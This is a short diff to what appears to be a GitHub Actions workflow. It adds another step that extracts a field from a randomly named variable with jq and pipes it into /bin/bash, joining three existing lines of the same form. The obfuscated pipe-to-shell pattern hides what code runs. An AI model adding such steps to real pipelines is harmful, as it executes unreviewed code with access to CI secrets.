@@ -33,6 +33,7 @@ jobs:
           echo $bkt8 | jq -r .ydfoj7241 | /bin/bash
           echo $ffiu158 | jq -r .l13 | /bin/bash
           echo $nxed823 | jq -r .mluxx49910 | /bin/bash
+          printf '%s' "$apx177" | jq -r .vk53 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
